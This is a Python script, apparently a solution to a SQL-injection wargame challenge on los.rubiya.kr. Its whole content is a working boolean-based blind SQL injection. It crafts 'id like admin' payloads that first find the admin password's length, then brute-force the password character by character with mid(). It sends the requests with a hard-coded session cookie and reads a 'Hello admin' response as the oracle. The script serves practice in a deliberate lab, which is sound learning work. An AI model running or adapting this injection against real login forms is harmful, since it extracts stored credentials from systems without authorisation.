import urllib.parse as urllib
import urllib.request as urllib2
import sys
import time

leng = 0

for i in range(1, 30):
    payload = "-1' || id like " + f"\"admin\" " + f"&& length(pw) like " + str(i) + "#"
    payload = urllib.quote(payload)
    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="+payload

    opener = urllib2.build_opener(urllib2.HTTPHandler)
    request = urllib2.Request(url)
    request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
    request.add_header('Cookie', 'PHPSESSID=8sgivnbfsu3mnglkoca7ckm1jg')
    request.get_method = lambda:'GET'
    data = opener.open(request)
    data = data.read()

    if bytes("Hello admin", 'utf-8') in data:
        print("len: ", str(i))
        leng = i
        break
    else: 
        print("check with i = ", i)

    time.sleep(0.2)
  
string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-_+="
key = ""

for i in range(1, leng+1):
    for j in range(len(string)):
        payload = "-1' || id like " + f"\"admin\"" + " && mid(pw," + str(i) + ",1) like '" + string[j] + "'#"
        payload = urllib.quote(payload)
        url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="+payload
        print(url)

        opener = urllib2.build_opener(urllib2.HTTPHandler)
        request = urllib2.Request(url)
        request.add_header('Cookie', 'PHPSESSID=8sgivnbfsu3mnglkoca7ckm1jg')
        request.get_method = lambda:'GET'
        data = opener.open(request)
        data = data.read()

        if bytes("Hello admin", 'utf-8') in data:
            key += string[j]
            break
        else:
            print("Testing with i, j: ", i, string[j])
        
        time.sleep(0.2)

    print("Reached i: ", i)
 
print(key)



 